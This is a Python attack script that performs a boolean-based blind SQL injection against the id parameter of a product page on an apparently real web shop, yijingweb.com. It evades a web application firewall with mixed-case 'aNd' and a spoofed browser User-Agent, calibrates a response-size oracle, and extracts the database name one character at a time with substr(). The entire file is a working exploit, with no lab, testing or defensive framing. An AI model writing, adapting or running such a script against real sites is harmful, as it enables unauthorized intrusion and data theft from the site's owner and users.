#!/usr/bin/env python3
"""yijingweb: blind extract using aNd (mixed case, passes WAF) + substr
Calibrate first: aNd (select 1)=1 vs =2 size difference
"""
import urllib.request, urllib.parse, string, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def sz(payload):
    code, size = fetch(BASE + "?id=686" + payload)
    return size

# calibrate with aNd
sizes_true = [sz("%27%20aNd%20(select%201)=1--%20") for _ in range(3)]
sizes_false = [sz("%27%20aNd%20(select%201)=2--%20") for _ in range(3)]
print("true: %s false: %s" % (sizes_true, sizes_false), flush=True)
t = sum(sizes_true)//3
f = sum(sizes_false)//3
print("avg true=%d false=%d diff=%d" % (t, f, t - f), flush=True)
if abs(t - f) < 10:
    print("ORACLE TOO WEAK - abort", flush=True)
    raise SystemExit
threshold = (t + f) / 2

def is_true(expr):
    payload = "%27%20aNd%20(" + urllib.parse.quote(expr) + ")--%20"
    s = sz(payload)
    return s > threshold

# verify
print("verify 1=1:", is_true("select 1=1"), "1=2:", is_true("select 1=2"), flush=True)

# extract db name
db = ""
for pos in range(1, 15):
    found = False
    for c in CHARS:
        expr = "select substr(database(),%d,1)='%s'" % (pos, c)
        if is_true(expr):
            db += c
            print("pos%d=%s -> %s" % (pos, c, db), flush=True)
            found = True
            break
    if not found:
        db += "?"
        print("pos%d=? -> %s" % (pos, db), flush=True)
    time.sleep(0.15)
print("DATABASE:", db, flush=True)
